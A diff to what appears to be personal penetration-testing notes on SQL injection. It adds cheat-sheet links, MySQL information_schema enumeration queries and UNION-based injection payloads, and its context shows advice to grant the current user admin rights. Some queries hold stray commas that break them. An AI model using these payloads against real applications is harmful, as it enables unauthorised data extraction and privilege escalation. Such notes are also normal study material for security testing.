@@ -4,6 +4,8 @@
 - If one is in a database with write access and there are roles assigned to users, give the current user admin rights.
 
 # SQL injection cheat sheets
+- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+- [https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
 - [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
 - [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
@@ -87,7 +89,46 @@ abcd' union select 1, concat(<data>,':',<data>) 3,4,5,6 from <table>;-- -
 ### References
 - [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
 
-# MySQL user defined functions
+# MySQL 
+## Structure
+```
+information_schema              Metadata and all the databases and tables
+information_schema.schemata     Databases
+information_schema.tables       Tables
+information_schema.columns      Columns
+```
+
+### Example commands
+```sql
+-- Databases
+SELECT group_concat(schema_name), from information_schema.schemata;
+
+-- Tables from DB
+SELECT group_concat(table_name), from information_schema.tables where table_schema='YOURDB';
+
+-- Columns from table
+SELECT group_concat(column_name),from information_schema.columns where table_name='TABLENAME';
+
+-- Get data
+SELECT data,data, from database.table;
+```
+
+## Union
+When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.
+
+### Examples
+```sql
+-- If values are returned in order
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+
+-- If more than one entry is returned but not all of the are in use
+SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
+```
+
+#### References
+- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
+
+## User defined functions
 [​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)
 
 
